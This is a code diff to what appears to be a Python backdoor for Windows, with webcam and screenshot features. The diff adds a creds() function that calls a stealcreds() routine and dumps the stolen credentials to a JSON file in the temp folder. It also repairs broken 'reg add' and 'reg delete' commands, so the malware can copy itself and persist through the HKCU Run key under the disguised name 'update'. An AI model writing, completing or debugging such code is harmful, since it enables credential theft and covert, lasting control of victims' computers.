@@ -2,6 +2,7 @@
 import subprocess as sp
 from cv2 import VideoCapture, imwrite
 from urllib.request import urlopen
+import credentials
 import pyautogui
 import requests
 import platform
@@ -183,7 +184,14 @@ def webshot():
 
 
 def creds():
-    pass
+    try:
+        data = credentials.stealcreds()
+        path = os.environ["temp"] + "\\data.json"
+        with open(path, 'w+') as outfile:
+            json.dump(data, outfile, indent=4)
+        return path
+    except Exception:
+        return False
 
 
 def persistent():
@@ -192,7 +200,7 @@ def persistent():
         if not os.path.exists(backdoor_location):
             shutil.copyfile(sys.executable, backdoor_location)
             sp.call(
-                'red add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f',
+                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f',
                 shell = True
             )
             return True
@@ -226,7 +234,7 @@ def selfdestruct():
         config_location = fr'C:\Users\{getUsername()}\.config'
         
         sp.call(
-            'red delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + update_location + '" /f',
+            'reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f',
             shell = True
         )
         
